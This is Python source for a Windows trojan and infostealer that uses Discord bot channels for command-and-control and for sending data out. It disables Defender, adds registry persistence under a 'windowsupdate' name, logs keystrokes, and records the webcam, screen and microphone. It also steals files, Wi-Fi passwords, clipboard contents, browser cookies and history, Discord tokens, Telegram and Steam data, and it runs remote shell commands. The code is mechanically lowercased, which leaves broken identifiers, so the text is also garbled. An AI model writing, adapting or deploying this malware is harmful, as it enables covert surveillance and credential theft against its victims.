import os,sys,json,base64,re,ctypes,subprocess,time,threading,shutil,fnmatch,zipfile,sqlite3,winreg,platform
from datetime import datetime
from pathlib import path
import requests
from crypto.cipher import aes
from pil import imagegrab
import pyaudio,wave,cv2,win32crypt,psutil

if os.name != "nt":
    sys.exit(0)

config = {}

bottoken = config.get("bottoken")
commandchan = config.get("commandchan")
exfilchan = config.get("exfilchan")

username = os.getenv("username", "")
computername = os.environ.get("computername", "unknown")
victimid = f"{computername}_{username}"

def discordapi(endpoint, method="get", data=none, files=none):
    url = f"https://discord.com/api/v10/{endpoint}"
    headers = {"authorization": f"bot {bottoken}", "user-agent": "mozilla/5.0"}
    if method == "get":
        return requests.get(url, headers=headers)
    elif method == "post":
        if files:
            return requests.post(url, headers=headers, data=data, files=files)
        else:
            return requests.post(url, headers=headers, json=data)

def sendexfil(content=none, filename=none):
    data = {"content": content} if content else {}
    files = none
    if filename:
        files = {"file": (filename, open(filename, "rb"))}
        data = {"content": f"file:{victimid}"}
    discordapi(f"channels/{exfilchan}/messages", "post", data=data, files=files)

def getsysteminfo():
    return {
        "user": username,
        "computer": computername,
        "os": platform.platform(),
        "cpu": platform.processor(),
        "ram": str(round(psutil.virtual_memory().total / (1024**3), 2)) + " gb",
        "ip": requests.get("https://api.ipify.org", timeout=5).text,
        "timestamp": datetime.now().isoformat()
    }

def addpersist():
    if not config.get("persist"):
        return
    try:
        key = winreg.hkey_current_user
        subkey = r"software\microsoft\windows\currentversion\run"
        with winreg.openkey(key, subkey, 0, winreg.key_set_value) as regkey:
            winreg.setvalueex(regkey, "windowsupdate", 0, winreg.reg_sz, sys.executable)
    except:
        pass

def disabledefender():
    if not config.get("disabledefender"):
        return
    cmds = ["set-mppreference -disablerealtimemonitoring $true","set-mppreference -disablebehaviormonitoring $true",
            "set-mppreference -disableblockatfirstseen $true","set-mppreference -disableioavprotection $true",
            "set-mppreference -disableprivacymode $true","set-mppreference -signaturedisableupdate $true",
            "add-mppreference -exclusionpath \"c:\\\""]
    for cmd in cmds:
        subprocess.run(["powershell", "-windowstyle", "hidden", cmd], capture_output=true)

def keylog():
    if not config.get("keylog"):
        return
    from ctypes import *
    from ctypes.wintypes import *
    wh_keyboard_ll = 13
    wm_keydown = 0x0100
    logfile = os.path.expandvars("%appdata%\\keys.log")
    def hookproc(ncode, wparam, lparam):
        if wparam == wm_keydown:
            with open(logfile, "a") as f:
                f.write(chr(lparam[0]))
            if os.path.getsize(logfile) > 500:
                sendexfil(content=open(logfile).read())
                open(logfile, "w").close()
        return callnexthookex(none, ncode, wparam, lparam)
    hook = setwindowshookexw(wh_keyboard_ll, hookproc, none, 0)
    msg = msg()
    while getmessagew(byref(msg), none, 0, 0):
        translatemessage(byref(msg))
        dispatchmessagew(byref(msg))

def webcamshot():
    if not config.get("webcam"):
        return
    try:
        cam = cv2.videocapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            sendexfil(filename="webcam.jpg")
        cam.release()
    except:
        pass

def screenshot():
    if not config.get("screenshot"):
        return
    img = imagegrab.grab()
    img.save("screenshot.png")
    sendexfil(filename="screenshot.png")

def screenrec():
    if not config.get("screenrec"):
        return
    duration = config.get("recordseconds", 30)
    import pyautogui, numpy as np
    size = pyautogui.size()
    fourcc = cv2.videowriter_fourcc(*"xvid")
    out = cv2.videowriter("recording.avi", fourcc, 20.0, size)
    start = time.time()
    while time.time() - start < duration:
        frame = np.array(pyautogui.screenshot())
        frame = cv2.cvtcolor(frame, cv2.color_bgr2rgb)
        out.write(frame)
        time.sleep(0.05)
    out.release()
    sendexfil(filename="recording.avi")

def micrecord():
    if not config.get("mic"):
        return
    duration = config.get("recordseconds", 30)
    chunk = 1024
    fmt = pyaudio.paint16
    channels = 1
    rate = 44100
    p = pyaudio.pyaudio()
    stream = p.open(format=fmt, channels=channels, rate=rate, input=true, frames_per_buffer=chunk)
    frames = [stream.read(chunk) for _ in range(0, int(rate / chunk * duration))]
    stream.stop_stream()
    stream.close()
    p.terminate()
    with wave.open("mic.wav", 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(fmt))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
    sendexfil(filename="mic.wav")

def searchfiles():
    if not config.get("filesearch"):
        return
    exts = config.get("fileexts", ".txt,.doc,.pdf").split(",")
    maxsize = config.get("maxfilesizemb", 10) * 1024 * 1024
    found = []
    for root, _, files in os.walk("c:\\users"):
        for ext in exts:
            for f in fnmatch.filter(files, "*"+ext):
                full = os.path.join(root, f)
                if os.path.getsize(full) <= maxsize:
                    found.append(full)
    if found:
        zipname = "stolen_files.zip"
        with zipfile.zippfile(zipname, 'w') as zf:
            for f in found[:50]:
                zf.write(f, os.path.basename(f))
        sendexfil(filename=zipname)

def stealwifi():
    if not config.get("wifi"):
        return
    try:
        res = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=true, text=true).stdout
        profs = re.findall(r"all user profile\s*:\s(.*)", res)
        data = []
        for p in profs:
            out = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"], capture_output=true, text=true).stdout
            key = re.search(r"key content\s*:\s(.*)", out)
            data.append({"ssid": p, "password": key.group(1) if key else none})
        sendexfil(content=json.dumps(data, indent=2))
    except:
        pass

def clipmonitor():
    if not config.get("clipboard"):
        return
    import win32clipboard
    last = ""
    while true:
        try:
            win32clipboard.openclipboard()
            data = win32clipboard.getclipboarddata()
            win32clipboard.closeclipboard()
            if data and data != last:
                last = data
                sendexfil(content=f"clipboard: {data}")
        except:
            pass
        time.sleep(2)

def browserhist():
    if not config.get("history"):
        return
    hist = os.getenv("localappdata", "") + "\\google\\chrome\\user data\\default\\history"
    if os.path.exists(hist):
        shutil.copy2(hist, "history.db")
        sendexfil(filename="history.db")

def stealtelegram():
    if not config.get("telegram"):
        return
    tdata = os.getenv("appdata", "") + "\\telegram desktop\\tdata"
    if os.path.exists(tdata):
        shutil.make_archive("telegram", "zip", tdata)
        sendexfil(filename="telegram.zip")

def stealsteam():
    if not config.get("steam"):
        return
    for f in path(os.getenv("appdata", "")).glob("**/ssfn*"):
        sendexfil(filename=str(f))

def stealalldata():
    if not config.get("tokens"):
        return
    local = os.getenv("localappdata", "")
    roaming = os.getenv("appdata", "")
    paths = {
        'discord': roaming + '\\discord',
        'discordcanary': roaming + '\\discordcanary',
        'discordptb': roaming + '\\discordptb',
        'chrome': local + "\\google\\chrome\\user data\\default",
        'edge': local + '\\microsoft\\edge\\user data\\default',
        'brave': local + '\\bravesoftware\\brave-browser\\user data\\default'
    }
    checked = []
    results = {"tokens": []}
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + "\\local state", "r") as f:
                key = json.load(f)['os_crypt']['encrypted_key']
        except:
            continue
        ldbpath = path + "\\local storage\\leveldb\\"
        if not os.path.exists(ldbpath):
            continue
        for file in os.listdir(ldbpath):
            if not file.endswith((".ldb", ".log")):
                continue
            with open(ldbpath + file, "r", errors="ignore") as f:
                content = f.read()
                for match in re.findall(r"dqw4w9wgxcq:[^\"\\s]*", content):
                    try:
                        enc = base64.b64decode(match.split(':')[1])
                        deckey = win32crypt.cryptunprotectdata(base64.b64decode(key)[5:], none, none, none, 0)[1]
                        cipher = aes.new(deckey, aes.mode_gcm, enc[3:15])
                        token = cipher.decrypt(enc[15:])[:-16].decode()
                        if token and token not in checked:
                            checked.append(token)
                            req = requests.get('https://discord.com/api/v10/users/@me', headers={"authorization": token})
                            if req.status_code == 200:
                                user = req.json()
                                results["tokens"].append({"token": token, "username": user.get("username"), "id": user.get("id"), "email": user.get("email")})
                    except:
                        pass
    if results["tokens"]:
        sendexfil(content=json.dumps(results, indent=2))
    cookiepath = local + "\\google\\chrome\\user data\\default\\cookies"
    if os.path.exists(cookiepath):
        shutil.copy2(cookiepath, "cookies.db")
        sendexfil(filename="cookies.db")
    for f in path(local).glob("roblox\\localstorage\\*.json"):
        with open(f, "r") as rf:
            if ".robolsecurity" in rf.read():
                sendexfil(filename=str(f))

def heartbeat():
    while true:
        sendexfil(content=f"heartbeat:{victimid}")
        time.sleep(60)

def cmdloop():
    lastid = 0
    while true:
        try:
            url = f"https://discord.com/api/v10/channels/{commandchan}/messages?limit=1"
            headers = {"authorization": f"bot {bottoken}"}
            res = requests.get(url, headers=headers)
            if res.status_code == 200:
                msgs = res.json()
                if msgs:
                    msg = msgs[0]
                    if msg.get("id") and int(msg["id"]) > lastid:
                        lastid = int(msg["id"])
                        content = msg.get("content", "")
                        if content.startswith(f"cmd:{victimid}:"):
                            cmd = content.split(":",2)[2]
                            if cmd.lower() == "exit":
                                break
                            elif cmd.lower().startswith("download "):
                                filepath = cmd[9:]
                                if os.path.exists(filepath):
                                    sendexfil(filename=filepath)
                            else:
                                output = subprocess.run(cmd, shell=true, capture_output=true, text=true)
                                result = output.stdout + output.stderr
                                sendexfil(content=f"result:{victimid}:{result[:1900]}")
            time.sleep(config.get("pollinterval", 30))
        except:
            time.sleep(30)

def runthreaded(target):
    t = threading.thread(target=target, daemon=true)
    t.start()

def main():
    addpersist()
    disabledefender()
    sendexfil(content=f"register:{victimid}:{json.dumps(getsysteminfo())}")
    runthreaded(heartbeat)
    runthreaded(keylog)
    runthreaded(webcamshot)
    screenshot()
    runthreaded(screenrec)
    runthreaded(micrecord)
    searchfiles()
    stealwifi()
    runthreaded(clipmonitor)
    browserhist()
    stealtelegram()
    stealsteam()
    stealalldata()
    runthreaded(cmdloop)
    while true:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
